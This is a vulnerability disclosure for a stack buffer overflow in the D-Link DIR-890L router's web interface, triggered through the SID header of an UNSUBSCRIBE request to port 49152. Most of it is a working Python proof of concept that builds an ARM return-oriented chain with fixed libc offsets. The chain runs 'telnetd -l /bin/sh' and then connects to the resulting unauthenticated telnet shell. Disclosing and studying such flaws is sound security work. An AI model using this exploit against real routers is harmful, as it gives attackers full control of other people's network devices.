
# Information

**Vendor of the products:**    D-Link

**Reported by:**    WangJincheng && FeiXincheng

**Affected products:**    D-Link DIR-890L <= v1.07

**Vendor Homepage:**    [https://www.dlink.com](https://www.dlink.com "https://www.dlink.com")

**Vendor Advisory:**     [http://legacyfiles.us.dlink.com/DIR-890L](http://legacyfiles.us.dlink.com/DIR-890L "http://legacyfiles.us.dlink.com/DIR-890L")

# Summarize

The LAN-side Web-Configuration Interface has Stack-based Buffer Overflow vulnerability in the `D-Link` Wi-Fi router firmware `DIR-890L`(version less than `1.07`).

The function created at `0x17958` of `/htdocs/cgibin` will call `sprintf` without checking the length of strings in parameters given by `HTTP header` and can be controlled by users easily.

The attackers can exploit the vulnerability to carry out arbitrary code through sending a specially constructed payload to port `49152`.

# Vulnerability Description

The vulnerability is detected at `/htdocs/cgibin`.

There is a `Stack-based Buffer Overflow vulnerability` in the function created at `0x17A60`. When we use `UNSUBSCRIBE` request, it will call the `sub_17958` function which created at `0x17958`.

However, in the `sub_17958` function, it will call `sprintf` without checking the length of `v2`, which causes the `stack overflow`. The `v2` here is `SID` parameter given by `HTTP header`.

# Poc

```python
# python3
from pwn import *
from socket import *
from os import *
from time import *
context(os = 'linux', arch = 'arm')

libc_base = 0xb6f7e000

s = socket(AF_INET, SOCK_STREAM)

cmd = b'telnetd -l /bin/sh;'
payload = b'a'*449
payload += p32(libc_base + 0x18298) # pop {r3, pc};
payload += p32(libc_base + 0x406f8) # mov r0, r1; pop {r3, pc};
payload += p32(libc_base + 0x390fc) # pc add r1, sp, #0x2c; blx r3;
payload += b'a'*4 # padding
payload += p32(libc_base + 0x5a270) # pc system
payload += b'a'*(0x2c-8) # padding
payload += cmd

msg = b"UNSUBSCRIBE /gena.cgi?service=0 HTTP/1.1\r\n"
msg += b"Host: localhost:49152\r\n"
msg += b"SID: " + payload + b"\r\n\r\n"

s.connect((gethostbyname("192.168.0.1"), 49152))
s.send(msg)

sleep(1)
system("telnet 192.168.0.1 23")
```

# Get Shell

Scan ports before exploit the vulnerability.

Exploit the vulnerability and get shell successfully.

Scan ports again and we can dectect that the port `23` which represents `Telnet` service has been opened.
